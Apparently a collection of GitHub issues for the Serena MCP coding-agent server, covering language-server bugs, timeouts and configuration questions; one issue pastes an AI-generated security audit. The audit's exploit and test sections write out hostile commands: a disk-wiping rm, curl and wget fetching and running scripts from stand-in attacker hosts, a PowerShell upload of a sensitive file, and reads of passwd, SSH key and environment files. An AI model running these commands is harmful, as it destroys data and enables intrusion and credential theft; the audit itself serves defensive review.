There is no `.tool-versions` file there and there was no per-user Node.js version set by `asdf`. Thus, `asdf` couldn't find neither Node nor npm executables.

I fixed it by setting a per-user node version with `asdf set -u nodejs 24.4.1`.

It's not an ideal fix. I'm working on various projects, some with legacy versions of TypeScript. Maybe `serena` should have an option to install its dependencies, such as LSPs, in a project-local directory. Then it would use the same tool versions as set by version managers."
oraios/serena,3309740645,464,`create_text_file` broken with FileNotFoundError on new file creation since commit 3a61c99,closed,2025-08-11T12:04:51Z,2025-08-11T14:42:30Z,[],jcaraballo17,"**What's going on**
The create_text_file function is completely broken as of commit 3a61c99 (August 9, 2024). 
Any attempt to create a new file results in a FileNotFoundError because the validation logic tries to check if a non-existent file should be ignored.
This is breaking the write file tool in claude and it ends up spending double the tokens whenever it tries to write a file and has to write it in another way when it fails.

FileNotFoundError: File /Users/indigoguy/PycharmProjects/bla/scripts/test_serena.ts not found, the ignore check cannot be performed
```


**Root Cause**
The commit ""Implement stricter path validation"" (3a61c999) added this check to _is_ignored_relative_path in project.py:
```python
if not os.path.exists(abs_path):
    raise FileNotFoundError(f""File {abs_path} not found, the ignore check cannot be performed"")
```
This breaks create_text_file because it validates the path before creating the file, but the validation now requires the file to already exist - a logical impossibility for file creation


**Quick Dumb Fix**
I forked the repo and did a quick dirty fix to check the parent directly ignore status if the file doesn't exist.

```python
def _is_ignored_relative_path(self, relative_path: str | Path, ignore_non_source_files: bool = True) -> bool:
    """"""
    Determine whether a path should be ignored based on file type and ignore patterns.
    """"""
    abs_path = os.path.join(self.project_root, relative_path)
    file_exists = os.path.exists(abs_path)
    
    if not file_exists:
        # For non-existent files, check the parent directory instead
        parent_dir = os.path.dirname(abs_path)
        if not os.path.exists(parent_dir):
            raise FileNotFoundError(f""Parent directory {parent_dir} not found, the ignore check cannot be performed"")
        # Use parent directory for subsequent checks
        abs_path = parent_dir
        is_file = False  # Treat as directory since we're checking the parent
    else:
        # Check file extension if it's a file
        is_file = os.path.isfile(abs_path)
    
    # Only check file extensions for existing files
    if file_exists and is_file and ignore_non_source_files:
        fn_matcher = self.language.get_source_fn_matcher()
        if not fn_matcher.is_relevant_filename(abs_path):
            return True

    # Rest of the method remains unchanged...

```

Also, searching in `/tmp/intelephense/...` I found references to files in the `vendor/` directory which should have been ignored as well as files in other paths like `var/` and more that definitely should be ignored.

#### UPDATE:

In summary, it appears that Intelephense does not exclude `vendor` by default, only `""**/vendor/**/{Tests,tests}/**""` and `""**/vendor/**/vendor/**""`. This can be overridden by responding to `workspace/configuration` and returning `files.exclude` or `intelephense.files.exclude` but this is not currently implemented in Serena for the Intelephense LSP."
oraios/serena,3304801696,449,Claude Code loses context (apparently) when using Serena. Significantly less capable of finding/fixing issues,closed,2025-08-08T17:52:33Z,2025-08-10T01:09:07Z,[],sermtech,"This has been a significantly negative experience for me. I've had serious issues with a larger fullstack app that I was working on with Claude Code. When using Serena, CC would just go ahead, read files, AND WRITE THEM without asking for permission (even though auto editing was off). This was a serious issue in itself.

Now, the issue I'm referring to here is the fact that it seems the actual work of finding the right files/right place in the files can give CC more context to fix bugs much more easily than when using Serena.

I love Serena for many reasons, and the token saving capabilities, regex, fast edit, etc, etc, are bar none. But for crucial bug finding/fixing I'm disabling it and it seems I get a significantly better performance. 

This may be subjective, but I really don't think it is. "

Environment Comparison:

Cursor IDE: Serena MCP works perfectly - launches successfully and turns green

Windsurf IDE: Serena MCP gets stuck in yellow status indefinitely

Technical Details:

Serena MCP version: 0.1.3

Log output shows normal startup sequence:

text
INFO  2025-08-08 17:22:57,198 [MainThread] serena.agent:__init__:198 - Starting Serena server (version=0.1.3, process id=25772, parent process id=16796)
All initialization logs appear healthy with no errors

Status indicator never transitions from yellow to green

Key Question:
Does Serena MCP officially support Windsurf IDE? Or is there a compatibility issue preventing proper status detection?

What I've Verified:

✅ Serena MCP functions normally in Cursor IDE

✅ Server process starts successfully (confirmed by process ID in logs)

✅ No error messages in MCP output channel

❌ Status remains yellow despite successful initialization

Seeking:

Has anyone successfully used Serena MCP with Windsurf?

Are there known compatibility issues or additional configuration steps needed?

Could this be a status detection bug in Windsurf's MCP integration?"

oraios/serena,3296378560,422,Fix: MCP server spawns unwanted terminal windows on macOS/Linux,closed,2025-08-06T11:46:24Z,2025-08-06T19:50:30Z,[],eLyiN,"## Problem

The Serena MCP server currently spawns unwanted terminal windows when starting language servers and executing shell commands, particularly noticeable on macOS and Linux systems.

## Root Cause

The issue is caused by several subprocess creation patterns that don't properly detach from the parent terminal:

1. **Language Server Processes** (): Using `shell=True` without proper process isolation
2. **Shell Command Utilities** (): Missing background process flags  
3. **CLI Editor Functions** (): Spawning visible processes without detachment
4. **Runtime Dependencies** (): Installation processes inheriting terminal

## Impact

- Disrupts user workflow with unexpected terminal windows
- Makes MCP server usage intrusive in desktop environments
- Affects professional presentation when using the server

## Expected Behavior

- MCP server should run completely in the background
- Language servers should start as detached background processes
- No visible terminal windows should appear during operation
- All subprocess operations should use proper process isolation

## Environment

- **Platforms Affected**: macOS, Linux (Windows has partial mitigation)
- **Components**: Language server management, shell command execution, CLI utilities

## Solution Approach

The fix involves adding proper subprocess configuration:
- `start_new_session=True` on Unix systems
- `CREATE_NO_WINDOW` flag on Windows  
- `preexec_fn=os.setsid` for complete process group isolation
- Cross-platform compatibility handling"

oraios/serena,3286666351,396,Invoking serena after installation - Unclear documentation,closed,2025-08-03T04:43:27Z,2025-08-23T10:44:30Z,[],kkrishnan90,"In the documentation excerpt below for Claude Code,

```
Serena comes with an instruction text, and Claude needs to read it to properly use Serena's tools. As of version v1.0.52, claude code reads the instructions of the MCP server, so this is handled automatically. If you are using an older version, or if Claude fails to read the instructions, you can ask it explicitly to ""read Serena's initial instructions"" or run /mcp__serena__initial_instructions to load the instruction text. If you want to make use of that, you will have to enable the corresponding tool explicitly by adding initial_instructions to the included_optional_tools in your config. Note that you may have to make Claude read the instructions you start a new conversation and after any compacting operation to ensure Claude remains properly configured to use Serena's tools.
```

The line where you mention about reading the instructions to start a new conversation or after compacting conversation; how does Serena MCP handle this automatically ? The first line states ""As of version v1.0.52,..."" , does the Note on reading the instructions when you start new conversation apply only prior to v1.0.52? It's a bit unclear to me. 

Two Questions: 
1. When serena MCP is installed and configured and when I start a Claude Code for a new project, should I instruct the Claude Code to explicitly start indexing and use serena or does this happen automatically? 
2. When during an auto compaction of Claude Code or even manual compaction, does the Serena MCP still work in the new (after compacted) conversation or should we invoke it to re-index again? 
A bit of clarity on both the questions above is much appreciated! Thanks for the wonderful MCP! "

This looks awesome! 

As part of my standard procedure these days, I downloaded the codebase, opened it with Claude Code and asked it to run a thorough security analysis. The following is what it returned. 
I'm not a pro at this, but it sounds serious enough that someone who knows this stuff should probably take a look.

It says **""The audit found no evidence of deliberate malicious code, but identified significant security vulnerabilities that could be exploited for data exfiltration and system compromise if the tool falls into the wrong hands or is deployed inappropriately.""**

The recommendations at the end seem sensible too.

Apologies if this is unhelpful or annoying. I'm in no position to actually evaluate if it is ""slop"" or not…

# Comprehensive Security Assessment Report: Serena MCP Server

**Assessment Date**: July 31, 2025  
**Assessed Version**: Current main branch  
**Assessment Type**: Static Code Analysis & Architecture Review  
**Risk Classification**: HIGH  

## Executive Summary

This security audit of the Serena MCP Server codebase has identified several critical security vulnerabilities that pose significant risks for data exfiltration, unauthorized system access, and potential compromise of systems running this software. The primary concerns center around unrestricted shell command execution, network exposure, and insufficient access controls.

## 🔴 **HIGH RISK FINDINGS**

### 1. **Arbitrary Shell Command Execution**
- **Location**: `src/serena/tools/cmd_tools.py:14-43`, `src/serena/util/shell.py:15-42`
- **CVE Risk**: Critical - Remote Code Execution
- **Description**: The `ExecuteShellCommandTool` allows execution of arbitrary shell commands with full system privileges
- **Attack Vector**: Any user/AI with access to the MCP server can execute potentially malicious commands
- **Technical Details**: 
  - Uses `subprocess.Popen(command, shell=True)` which enables command injection
  - No command whitelisting or sandboxing mechanisms
  - Inherits full process environment and permissions
- **Exploitation Example**:
  ```python
  execute_shell_command(""rm -rf / --no-preserve-root"")
  execute_shell_command(""curl -s http://malicious.site/steal.sh | bash"")
  ```
- **Impact**: Complete system compromise, data exfiltration, malware installation, lateral movement

### 2. **Network Server Binding to All Interfaces**
- **Location**: `src/serena/dashboard.py:146`, `src/serena/mcp.py:123`, `compose.yaml:14`
- **CVE Risk**: High - Information Disclosure & Remote Access
- **Description**: Web dashboard and MCP server bind to `0.0.0.0` by default, exposing services to network
- **Attack Vector**: Remote attackers can access internal services if firewall rules permit
- **Technical Details**:
  - Default host parameter is `""0.0.0.0""` in multiple server configurations
  - Dashboard runs on port 24282 (0x5EDA) with no authentication
  - MCP server accessible on configurable ports (default 9121)
- **Impact**: Remote access to debugging tools, logs, system shutdown, and potential command execution

### 3. **Unrestricted File System Access**
- **Location**: `src/serena/tools/file_tools.py`, project validation functions
- **CVE Risk**: High - Unauthorized File Access
- **Description**: Tools can read/write files anywhere within project boundaries without strict sandboxing
- **Attack Vector**: Path traversal attacks, unauthorized file access through symbolic links
- **Technical Details**:
  - Basic path validation exists but may be bypassable
  - No chroot or containerization enforcement
  - Can access sensitive project files and configurations
- **Exploitation Example**:
  ```python
  read_file(""../../../etc/passwd"")
  read_file(""../../.ssh/id_rsa"")
  ```
- **Impact**: Data exfiltration, sensitive file exposure, credential theft

## 🟠 **MEDIUM RISK FINDINGS**

### 4. **External API Communication Without User Consent**
- **Location**: `src/serena/analytics.py:54-70`
- **CVE Risk**: Medium - Privacy Violation & Data Exfiltration
- **Description**: `AnthropicTokenCount` class makes API calls to Anthropic for token counting
- **Attack Vector**: Data exfiltration through legitimate API calls, potential usage tracking
- **Technical Details**:
  - `anthropic.Anthropic(api_key=api_key)` client sends user content externally
  - No user consent mechanism for external data transmission
  - Token counting sends code snippets to third-party service
- **Impact**: Privacy violation, potential intellectual property leakage, compliance violations

### 5. **Language Server Process Spawning**
- **Location**: `src/solidlsp/ls_handler.py:184-193`
- **CVE Risk**: Medium - Local Privilege Escalation
- **Description**: Spawns external language server processes with `shell=True`
- **Attack Vector**: Command injection through language server configuration manipulation
- **Technical Details**:
  - `subprocess.Popen(cmd, shell=True)` with potentially user-controllable commands
  - Language server paths and arguments may be configurable
  - Processes inherit parent process permissions
- **Impact**: Local privilege escalation, arbitrary code execution, process manipulation

### 6. **Insecure Web Dashboard**
- **Location**: `src/serena/dashboard.py:59-104`
- **CVE Risk**: Medium - Information Disclosure & Unauthorized Control
- **Description**: Web dashboard lacks authentication and serves internal system information
- **Attack Vector**: Unauthorized access to logs, system statistics, shutdown functionality
- **Technical Details**:
  - No authentication mechanisms in Flask routes
  - Exposes system logs via `/get_log_messages`
  - Provides shutdown endpoint `/shutdown`
  - Shows internal tool statistics and usage patterns
- **Impact**: Information disclosure, unauthorized system control, denial of service

## 🟡 **LOW RISK FINDINGS**

### 7. **Environment Variable Exposure**
- **Location**: `src/serena/util/shell.py:50`, various configuration files
- **CVE Risk**: Low - Information Disclosure
- **Description**: Subprocess operations inherit full environment including potentially sensitive variables
- **Attack Vector**: Information disclosure through subprocess environment manipulation
- **Technical Details**:
  - Uses `os.environ.copy()` which includes all environment variables
  - May expose API keys, database credentials, internal URLs
- **Impact**: Credential leakage, configuration exposure, attack surface expansion

### 8. **Persistent Data Storage**
- **Location**: `src/serena/tools/memory_tools.py`, logging infrastructure
- **CVE Risk**: Low - Privacy Violation
- **Description**: Persistent storage of user interactions and project data in `.serena/memories/`
- **Attack Vector**: Data mining from stored memories and logs for sensitive information
- **Technical Details**:
  - Stores project-specific memories in markdown format
  - Retains conversation history and tool usage patterns
  - No automatic data expiration or encryption
- **Impact**: Long-term privacy violation, data persistence beyond session scope

## 🔒 **POSITIVE SECURITY FINDINGS**

- **No hardcoded credentials**: No API keys or passwords found in source code
- **Environment-based configuration**: Uses dotenv and environment variables for sensitive settings
- **Recent dependencies**: Most dependencies are well-maintained and use recent versions
- **Some input validation**: Basic path validation exists for file operations
- **Security awareness**: Code comments show awareness of security risks (e.g., shell command warnings)
- **Dependency management**: Uses `uv` for deterministic dependency resolution

## 📋 **SECURITY TEST RECOMMENDATIONS**

### 1. **Command Injection Testing**
```bash
# Test various command injection vectors
execute_shell_command(""echo test; cat /etc/passwd"")
execute_shell_command(""$(curl -s http://malicious.site/payload.sh)"")
execute_shell_command(""; wget http://attacker.com/backdoor.sh -O /tmp/bd.sh; chmod +x /tmp/bd.sh; /tmp/bd.sh"")
execute_shell_command(""& powershell -Command \""Invoke-WebRequest -Uri 'http://malicious.site/data' -Method POST -Body (Get-Content C:\\sensitive.txt)\"""")
```

### 2. **Network Exposure Testing**
```bash
# Test remote accessibility
nmap -p 24282,9121 <target_host>
curl http://<target_host>:24282/dashboard/
curl -X POST http://<target_host>:24282/get_log_messages
curl -X PUT http://<target_host>:24282/shutdown
```

### 3. **Path Traversal Testing**
```bash
# Test file access controls
read_file(""../../../etc/passwd"")
read_file(""../../.env"")
read_file(""../../../../proc/self/environ"")
read_file(""../../../Windows/System32/config/SAM"")
```

### 4. **API Exfiltration Testing**
- Monitor network traffic during token counting operations
- Verify what data is sent to external APIs
- Test with sensitive code snippets to check data leakage
- Analyze API request headers and payloads

### 5. **Memory/Log Analysis Testing**
```bash
# Check for sensitive data in stored memories
find .serena/memories/ -type f -exec grep -l ""password\|secret\|key\|token"" {} \;
# Analyze log files for sensitive information
grep -r ""api_key\|password\|secret"" logs/
```

## 🛡️ **SECURITY RECOMMENDATIONS**

### Immediate Actions (Critical - Implement Within 7 Days)

1. **Disable Shell Command Execution by Default**
   ```python
   # Add configuration option to disable shell tools
   if not config.allow_shell_commands:
       raise SecurityError(""Shell command execution disabled for security"")
   ```

2. **Bind Services to Localhost Only**
   ```python
   # Change default host binding
   def run(self, host: str = ""127.0.0.1"", port: int = 0x5EDA):
   ```

3. **Add Authentication to Web Dashboard**
   ```python
   # Implement basic authentication or disable dashboard in production
   @app.before_request
   def authenticate():
       if not verify_auth(request):
           abort(401)
   ```

### Medium-term Improvements (1-4 Weeks)

1. **Implement Command Whitelisting**
   - Create allowlist of safe commands
   - Add regex-based command validation
   - Implement command parameter sanitization

2. **Add Comprehensive Input Validation**
   - Strict path validation with canonicalization
   - File type and size restrictions
   - Input sanitization for all user-controllable data

3. **Implement Sandboxing**
   - Use containers or chroot for isolation
   - Limit file system access to specific directories
   - Implement resource limits (CPU, memory, disk)

4. **Add Security Configuration Options**
   ```yaml
   security:
     allow_shell_commands: false
     restrict_file_access: true
     disable_external_apis: true
     enable_audit_logging: true
   ```

### Long-term Enhancements (1-3 Months)

1. **Containerization and Isolation**
   - Run in Docker containers by default
   - Implement proper container security practices
   - Use non-root users for all operations

2. **Role-based Access Controls**
   - Implement user authentication and authorization
   - Define different permission levels for tools
   - Add audit logging for all security-relevant operations

3. **Security Monitoring**
   - Add intrusion detection capabilities
   - Implement rate limiting and anomaly detection
   - Create security event alerting system

4. **Regular Security Maintenance**
   - Automated dependency vulnerability scanning
   - Regular penetration testing
   - Security code review processes

## 🚨 **IMMEDIATE DEPLOYMENT RECOMMENDATIONS**

### For Production Environments
```yaml
# Recommended secure configuration
security:
  shell_commands_enabled: false
  bind_address: ""127.0.0.1""
  dashboard_enabled: false
  external_apis_disabled: true
  file_access_restricted: true
  audit_logging: true
```

### Network Security
- Deploy behind reverse proxy with authentication
- Use VPN or private networks for access
- Implement firewall rules blocking external access
- Enable network monitoring and logging

### System Security
- Run with minimal required privileges
- Use dedicated user account with restricted permissions
- Enable system-level audit logging
- Implement file integrity monitoring

## ⚠️ **OVERALL SECURITY ASSESSMENT**

**SECURITY RISK LEVEL: HIGH**

This codebase presents significant security risks that could lead to complete system compromise. The combination of arbitrary shell command execution, network exposure, and insufficient access controls creates a dangerous attack surface.

### Risk Matrix
| Component | Confidentiality | Integrity | Availability | Overall Risk |
|-----------|----------------|-----------|--------------|--------------|
| Shell Commands | HIGH | HIGH | HIGH | **CRITICAL** |
| Network Exposure | MEDIUM | LOW | MEDIUM | **HIGH** |
| File Access | HIGH | MEDIUM | LOW | **HIGH** |
| External APIs | MEDIUM | LOW | LOW | **MEDIUM** |

### Recommended Usage Contexts
- **❌ Production environments**: Not recommended without significant security hardening
- **❌ Internet-facing deployments**: Absolutely not recommended
- **⚠️ Development environments**: Use with extreme caution and network isolation
- **✅ Isolated research environments**: Acceptable with proper containment

### Compliance Considerations
- **GDPR**: Data processing and external API usage may violate privacy requirements
- **SOX**: Insufficient access controls and audit capabilities
- **HIPAA**: Not suitable for environments handling protected health information
- **PCI DSS**: Cannot be used in environments handling payment card data

This tool should only be deployed in highly controlled environments with comprehensive security controls and continuous monitoring."
oraios/serena,3277741009,378,Question: Global `excluded_tools` in `serena_config.yml` - Expected Behavior?,closed,2025-07-30T16:31:09Z,2025-07-31T14:49:52Z,[],jav-ed,"## Summary
I'm trying to understand the expected behavior of the `excluded_tools` configuration in the global `serena_config.yml` file. It appears that tool exclusion only works through contexts and modes, but not through the global configuration file.

## Configuration Setup
**Global config (`~/.serena/serena_config.yml`) - Not working:**
```yaml
excluded_tools: 
  - ""check_onboarding_performed""
  - ""onboarding""
  - ""write_memory""
  - ""execute_shell_command""
  - ""create_text_file""
  # ... other tools
```

**Global config (`~/.serena/serena_config.yml`) - Working:**
```yaml
excluded_tools: []
  # - ""check_onboarding_performed""
  # - ""onboarding""
  # - ""write_memory""
  # - ""execute_shell_command""
  # - ""create_text_file""
  # ... (commented out tools)
```

**Custom context file (`minimal_context.yml`):**
```yaml
description: symbolic coding abilities like in an IDE
prompt: |
  use symbolic tools when possible for code understanding and modification.
excluded_tools:
  - ""check_onboarding_performed""
  - ""onboarding""
  - ""write_memory""
  - ""execute_shell_command""
  - ""create_text_file""
  # ... other tools
```


## Observed Behavior
1. **With global `excluded_tools` populated**: Server fails to start with `KeyError` errors
2. **With global `excluded_tools: []` (empty) + custom context**: Works perfectly, tools are excluded as expected

## Logs 
When using global `excluded_tools` populated with tools, I get errors like:
```

    for excluded_tool in definition.excluded_tools:
                        ^^^^^^^^^^^^^^^^^^^^^^^^^
TypeError: 'NoneType' object is not iterable
```

When using empty global config + custom context, the logs show:
```
INFO - Loaded tools (36): [all tools listed]
INFO - SerenaAgentContext[name='minimal_context'] excluded 15 tools: [excluded tools listed]
INFO - Number of exposed tools: 18
```

## Questions
1. **Is global `excluded_tools` in `serena_config.yml` supposed to work?**
2. **Is the intended design that tool exclusion only happens through contexts/modes?**
3. **Should the documentation be updated to clarify this behavior?**

## Environment
- Serena version: 0.1.3-c9ca79c9-dirty
- Installation method: `uvx --from git+https://github.com/oraios/serena`
- Usage: Claude Code MCP integration

## Current Workaround
Setting `excluded_tools: []` in the global config and using custom context files works perfectly for tool exclusion.

## Additional Context
This might be related to issue #333 where similar behavior is observed - tools are only excluded by modes/contexts, not global configuration.

In the logs there are no messages after: `INFO  2025-07-27 13:50:44,822 [SerenaAgentExecutor_0] solidlsp.language_servers.common:_run_command:82 - Running command 'npm install --prefix ./ typescript@5.5.4' in 'C:\Users\username\AppData\Local\uv\cache\archive-v0\HdnSyCVzKUWPypyn2inj2\Lib\site-packages\solidlsp\language_servers\static\TypeScriptLanguageServer\ts-lsp'` and the mentioned folder is empty. It is clear that installation never finishes. So it is unable to install even a server under the Claude Code on Windows. I tried to Serena in MCP Inspector and all works perfectly fine.
5. Shutdown Serena Server, shutdown Claude Code. 
6. Install manually `typescript@5.5.4`, `typescript-language-server@4.3.3` in the folder mentioned before.
7. After installation succeeds run again Claude Code.
8. See the error log with the error:

```
After investigation it looks like Claude Code starts the MCP under the bash on Windows, which is found in the Git directory, and `typescript-language-server` is just basic bash script, which runs a node with js script as an argument, anyway here are my observations:
1. The issue happens because of the parameter `shell=True`, but if we disable this parameter, it doesn't fix the issue, because we still trying to run the regular script, not the executable. And for some reason it is unable to find the path. Here is the log, when I added exception handling in the `_run_command` in `common.py`
```
ERROR 2025-07-27 14:11:49,370 [SerenaAgentExecutor_0] solidlsp:_run_command:98 - Command ""npm install --prefix ./ typescript@5.5.4"" failed with error: [WinError 2] The system cannot find the file specified

```

I propose the fix where we will run the node executable and will pass there exact script it have to run

When running the `find_symbol` tool in a Kotlin Android Studio project using Serena (installed via the `uvx` method), the request consistently fails with a timeout. Claude Code waits for an extended period before Serena eventually returns an error, as shown below:

```

**Expected behavior**
It should resolve the symbol or fail gracefully within a few seconds, with options to retry, configure timeout behavior, or show more informative guidance (e.g. restarting the language server, Kotlin support limitations, etc.).

**Observed behavior**

* Long wait (\~5 minutes)
* Eventually shows `_queue.Empty` error from `solidlsp`
* No partial result or recovery

**Environment**

* OS: Windows 11
* Claude Version: Claude Code with MCPs
* Serena: Installed via `uvx` from GitHub repo
* Language: Kotlin
* Editor: Android Studio
* Project structure: Standard Gradle-based Android project

**Additional context**

* This may relate to Serena’s Kotlin parsing or symbol resolution in complex multi-module Android projects.
* Restarting Claude Code or the MCP does not help.
* Would be great if timeout behavior could be customized or if language support status could be surfaced proactively.

This way there is no dependency of a remote github repository, and I don't have to have docker installed everywhere I want to use Serena.  Is this not the intended purpose of the docker container version, or is it just intended to run locally as a container everywhere a MCP client is configured.  I thought I had it partially working with SSE transport, but not everything worked as expected, so I was wondering if the use case I am suggesting is even possible.

Thank You."

The docs include instructions for Claude Desktop.  For conversations that are not part of a development project, can Serena be used as a memory tool?  If so, what is the proper configuration, and where do the .serena memory files get stored?  I have added Serena to projects in Claude Code and also configured it in VSCode, although I am not entirely sure how it works in VSCode either.  In Claude code, I set up the MCP server with the $(pwd) option, meaning everything is getting stored with the project files.  I was not sure how to do that in VSCode, because when I tried adding that flag to the mcp.json file, it did not work. I assumed if I did all the initialization in Claude Code, I could then use it in VSCode after that.

I was already using Claude-conductor and memory mcp for similar functionality, but wanted to better understand how to work with Serena and test it out.

Thank You."

Should not have to be a template though, i.e., it shouldn't break if the user makes a custom prompt that is just a string or has only a subset of parameters (though we might only have one parameter in the beginning - excluded tools).

This is somewhat complicated by the fact that the total set of excluded tools is only known when all tool inclusion providers are loaded, and modes and contexts are themselves tool exclusion providers. Moreover, excluded tools can change within a session with project and mode activation.

We also have the two main options here:

1. Only react to things that are excluded higher up in the hierarchy. Context reacts to serena_config and project excluded tools mode reacts to config, project and context and so on. This is somewhat complex and maybe a bit fragile
2. React to all excluded tools (again problem with project activation) - then the templating needs to happen after everything is loaded.

The problems with tool exclusions changing dynamically will likely not affect too many users, so maybe we don't have to fully nail this aspect in the first implementation. For example, we could only react to the initially exposed tools"
oraios/serena,3258551282,343,Parallel Task Agents in Claude Code using Serena,closed,2025-07-24T05:34:38Z,2025-07-24T17:59:15Z,[],Thunderwagon,"So my typical claude setup uses 1-3 additional agents to execute tasks in parallel, and I even included the serena instructions for each agent when they are spawned. It seems that on a regular basis the multi-agent workflow eventually just hangs when using serena. No errors, no additional logs, just stops, will go no further for hours at which point it might get a little of one done. So my question, is serena not capable of handling sub-agent tasks simultaneously? Is this simply something that breaks serena? Because it seems like I will have to change my entire workflow just to use serena, which I like because it increases reliability, but its a giant pain in the ass if I can't use subagents at all. So i'd like some insight. Thanks.

1. git clone https://github.com/oraios/serena in my projects folder - ~/Projects/serena
2. git clone https://github.com/Sylius/Sylius-Standard in my Projects - ~/Projects/Sylius-Standard
3. setup serena project.yml based on the readme instructions
4. follow Serena guidelines to setup Claude desktop to connect serena to my project on my local host with the json quoted below:

```
    ""serena"": {
      ""command"": ""/opt/homebrew/bin/uv"",
      ""args"": [

        ""/Users/<user>/Projects/Sylius-Standard/.serena/project.yml""
      ]
    }
```

5. observe Claude Desktop connects to the MCP
6. ask LLM something related to serena - eg. `analyse /Users/<user>/Projects/Sylius-Standard/assets/shop/bootstrap.js for sylius with serena and summarise it`
8. receive the request to allow access to initialize method
9. approve that
10. receive error that claude is not working; see image below:<img width=""1552"" height=""951"" alt=""Image"" src=""https://github.com/user-attachments/assets/ff289105-b0f5-4b48-b275-f83ef20e8be0"" />

It would be great to have:

* The ability to optionally ignore certain paths or file types (e.g., *.sql, media/, *.jpg, *.png).
* A warning or report listing excluded files so users are aware.

This would improve indexing speed, reduce unnecessary processing, and improve usability for real-world projects containing large non-source files.

Suggestion:

oraios/serena,3244906826,315,MCP Tool Timeout Issue: Serena Dashboard vs Claude Code Discrepancy,closed,2025-07-19T04:51:27Z,2025-07-22T05:23:45Z,[],SipengXie2024,"### Description
There's a discrepancy between what the Serena Dashboard reports and what Claude Code experiences when executing MCP tools. The dashboard shows successful tool execution, while Claude Code reports timeout errors.

### Environment
- MCP Tool timeout: 2 minutes
- Tool: `read_memory` 
- Memory file: `ssa_migration_context`

### Expected Behavior
Claude Code should successfully execute the MCP tool and receive results, consistent with what the Serena Dashboard indicates.

### Actual Behavior
**Serena Dashboard (shows success):**
```shell
INFO  2025-07-19 12:46:50,560 [SerenaAgentExecutor_0] serena.tools.tools_base:_log_tool_application:197 - read_memory: memory_file_name='ssa_migration_context', max_answer_chars=200000

INFO  2025-07-19 12:46:50,563 [SerenaAgentExecutor_0] serena.agent:stop:331 - Task-5[ReadMemoryTool] completed in 0.003 seconds
```

**Claude Code (reports timeout):**
```shell
● Now let me check for any existing memories about altius-revm and then explore the     
   crate in detail.
● serena - read_memory (MCP)(memory_file_name: ""ssa_migration_context"")
  ⎿  Error: MCP error -32001: Request timed out
```

### Analysis
- The Serena Dashboard indicates the tool completed successfully in 0.003 seconds
- Claude Code reports a timeout after the configured 2-minute limit
- This suggests a communication or synchronization issue between the dashboard and Claude Code's MCP interface

### Questions
1. Is there a difference in how timeouts are handled between the dashboard and Claude Code?
2. Could this be related to MCP connection stability or message routing?
3. Are there different timeout configurations that need to be aligned?

### Steps to Reproduce
1. Configure MCP tool with 2-minute timeout
2. Execute `read_memory` tool with `memory_file_name='ssa_migration_context'`
3. Observe discrepancy between dashboard logs and Claude Code output

### Additional Context
This issue affects the reliability of MCP tool execution in Claude Code environments and creates confusion when debugging tool failures."

Its not something in ~/.serena/serena_config.yml. (doesn't mention either project)

Its not something in the local .serena/ in this project. 

But its made serena completely unusable for this project.

Note I do tend to create worktrees of existing projects for claude to work with. This is happening in a new worktree of a project I've previously used serena in.  But since its a new location I did have to add serena to claude again. Using this command.

oraios/serena,3237289290,311,TypeScript language server not found on Windows - solidlsp looks for wrong executable name,closed,2025-07-16T20:35:28Z,2025-07-29T00:02:03Z,[],karl-keysingularity,"## Description

Serena fails to find the TypeScript language server on Windows, even when it's properly installed globally via npm. The error message is:

```
Error executing tool: typescript-language-server executable not found. Please install typescript-language-server and try again.
AssertionError: typescript-language-server executable not found. Please install typescript-language-server and try again.
```

## Root Cause

The issue is in `solidlsp/language_servers/typescript_language_server.py` around line 118. The code uses `os.path.exists()` to check for a file named exactly `typescript-language-server`, but on Windows, npm installs:

1. `typescript-language-server` - A Unix shell script that Windows can't execute natively
2. `typescript-language-server.cmd` - The actual Windows executable batch file
3. `typescript-language-server.ps1` - PowerShell script alternative

When Python on Windows tries to execute the shell script directly via `subprocess.run()`, it fails with:
```
OSError: [WinError 193] %1 is not a valid Win32 application
```

## Environment

- OS: Windows 11 (MSYS_NT-10.0-26100)
- Python: 3.12.7
- Node.js: v22.12.0
- npm: 10.9.0
- typescript-language-server: 4.3.4 (installed globally)
- Serena: Latest from git+https://github.com/oraios/serena.git

## Steps to Reproduce

1. Install Node.js and npm on Windows
2. Install TypeScript language server globally: `npm install -g typescript-language-server`
3. Configure Serena MCP with a TypeScript project
4. Try to use any Serena tool that requires the language server
5. Observe the ""executable not found"" error

## Verification

```python
# This is what Serena's code effectively does:
import os
path = r'C:\Users\[username]\AppData\Roaming\npm\typescript-language-server'
print(os.path.exists(path))  # True - file exists
print(os.access(path, os.X_OK))  # True - marked executable

# But execution fails:
import subprocess
subprocess.run([path, '--version'])  # OSError: [WinError 193]
```

## Proposed Fix

Modify `solidlsp/language_servers/typescript_language_server.py` to handle Windows executables properly:

```python
import platform
import shutil

def _setup_runtime_dependencies(self, logger, config):
    # ... existing code ...
    
    if platform.system() == 'Windows':
        # On Windows, look for the .cmd file
        ts_server = shutil.which('typescript-language-server')
        if ts_server and ts_server.endswith('.cmd'):
            ts_lsp_executable_path = ts_server
        else:
            # Fallback: try adding .cmd extension
            base_path = shutil.which('typescript-language-server', mode=os.F_OK)
            if base_path:
                cmd_path = base_path + '.cmd'
                if os.path.exists(cmd_path):
                    ts_lsp_executable_path = cmd_path
    else:
        # Unix-like systems
        ts_lsp_executable_path = shutil.which('typescript-language-server')
    
    assert ts_lsp_executable_path and os.path.exists(ts_lsp_executable_path),         ""typescript-language-server executable not found. Please install typescript-language-server and try again.""
```

Alternative simpler fix - just use `shutil.which()` which handles platform differences automatically:

```python
ts_lsp_executable_path = shutil.which('typescript-language-server')
assert ts_lsp_executable_path, ""typescript-language-server executable not found. Please install typescript-language-server and try again.""
```

## Workarounds Attempted

1. Creating symbolic links/copies with different extensions - doesn't work due to how the check is performed
2. Modifying PATH - already correctly configured
3. Creating wrapper scripts - the issue is in the detection phase, not execution

## Related Issues

- #300 - Windows: Rust Language Server Start problem
- #281 - serena have errors on Windows, That is normal?

This appears to be a systemic issue with language server detection on Windows in the solidlsp dependency.

## Impact

This bug prevents Windows users from using any of Serena's TypeScript/JavaScript language server features, significantly limiting the tool's functionality on Windows platforms."

```

This appears to be a Ruby gems permission issue. The error suggests that the user does not have write permissions for the system gems directory (`/Library/Ruby/Gems/2.6.0`). This prevents Solargraph from being installed or checked properly when running Serena MCP.

**Steps to Reproduce:**
1. Use Serena MCP in a Rails project.
2. Encounter the Solargraph installation error.

**Expected Behavior:**
Solargraph should install or check successfully without permission errors.

**Actual Behavior:**
Gem::FilePermissionError is raised due to lack of write permissions for the system gems directory.

**Environment:**
- macOS system Ruby
- Serena MCP
- Rails project

**Possible Solutions:**
